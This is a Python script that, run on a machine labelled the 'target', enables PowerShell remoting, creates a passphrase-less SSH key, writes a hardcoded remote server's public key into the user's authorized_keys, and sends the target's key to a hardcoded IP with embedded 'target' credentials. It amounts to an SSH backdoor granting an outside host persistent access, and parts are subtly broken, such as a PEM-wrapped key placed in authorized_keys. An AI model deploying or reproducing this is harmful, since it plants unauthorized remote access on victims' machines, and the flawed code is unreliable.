import subprocess
import os
import winrm  # For PowerShell remoting
import paramiko  # For SSH (for the return connection)
import base64

# Configuration (Hardcoded for now - replace with secure retrieval later)
SERVER_IP = "197.23.44.88"  # Your server's IP
SERVER_PUBLIC_KEY = "-----BEGIN PUBLIC KEY-----\n" \
                    "AAAAB3NzaC1yc2EAAAADAQABAAABAQC/....your public key.....\n" \
                    "-----END PUBLIC KEY-----\n"  # Your server's public key
TARGET_USER = "target_user" # Target machine username
TARGET_USER_PASSWORD = "target_password" # Target machine password

def generate_ssh_keys():
    """Generates SSH keys and returns the public key."""
    try:
        # Create .ssh directory if it doesn't exist
        ssh_dir = os.path.expanduser("~/.ssh")
        if not os.path.exists(ssh_dir):
            os.makedirs(ssh_dir, exist_ok=True)

        # Generate SSH key (using subprocess for better security)
        subprocess.run(["ssh-keygen", "-t", "rsa", "-b", "4096", "-f", os.path.join(ssh_dir, "id_rsa"), "-N", ""], check=True) # -N "" for no passphrase

        # Read the public key
        with open(os.path.join(ssh_dir, "id_rsa.pub"), "r") as f:
            public_key = f.read().strip()
        return public_key
    except subprocess.CalledProcessError as e:
        print(f"Error generating SSH keys: {e}")
        return None
    except Exception as e:
        print(f"Error: {e}")
        return None


def enable_psremoting():
    """Enables PowerShell remoting and sets execution policy."""
    try:
        ps_commands = [
            "Enable-PSRemoting -Force",
            "Set-ExecutionPolicy RemoteSigned -Scope CurrentUser -Force"  # More secure scope
        ]
        for cmd in ps_commands:
            subprocess.run(["powershell", "-Command", cmd], check=True)
        print("PowerShell remoting enabled and execution policy set.")
    except subprocess.CalledProcessError as e:
        print(f"Error enabling PS Remoting: {e}")
    except Exception as e:
        print(f"Error: {e}")


def add_server_pub_key(server_pub_key):
    """Adds the server's public key to authorized_keys."""

    ssh_dir = os.path.expanduser("~/.ssh")
    authorized_keys_path = os.path.join(ssh_dir, "authorized_keys")
    try:
        if not os.path.exists(authorized_keys_path):
            with open(authorized_keys_path, "w") as f:
                f.write(server_pub_key)
        else: # Add if not already present
            with open(authorized_keys_path, "r") as f:
                existing_keys = f.read()

            if server_pub_key not in existing_keys:
                with open(authorized_keys_path, "a") as f:
                    f.write("\n" + server_pub_key)
        print("Server's public key added to authorized_keys.")
    except Exception as e:
        print(f"Error adding server's public key: {e}")


def send_public_key(target_pub_key):
    """Sends the target's public key to the server using PowerShell Remoting."""
    try:
        s = winrm.Session(SERVER_IP, auth=(TARGET_USER, TARGET_USER_PASSWORD), transport='ntlm') # Use a more secure authentication method if possible (CredSSP, NTLM, Kerberos)
        ps_script = f"""
        $publicKey = @"{target_pub_key}"
        # You would typically store this in a file on the server.
        # This is simplified for the example
        Write-Host $publicKey
        """
        result = s.run_ps(ps_script)

        if result.status_code == 0:
            print("Target's public key sent successfully.")
        else:
            print(f"Error sending public key: {result.std_err}")

    except Exception as e:
        print(f"Error sending public key via WinRM: {e}")

def disable_psremoting():
    try:
        ps_commands = [
            "Disable-PSRemoting -Force"
        ]
        for cmd in ps_commands:
            subprocess.run(["powershell", "-Command", cmd], check=True)
        print("PowerShell remoting disabled.")
    except subprocess.CalledProcessError as e:
        print(f"Error disabling PS Remoting: {e}")
    except Exception as e:
        print(f"Error: {e}")


if __name__ == "__main__":
    enable_psremoting()
    target_public_key = generate_ssh_keys()

    if target_public_key:
        add_server_pub_key(SERVER_PUBLIC_KEY) # Add server public key to authorize incoming SSH connections
        send_public_key(target_public_key)
        disable_psremoting()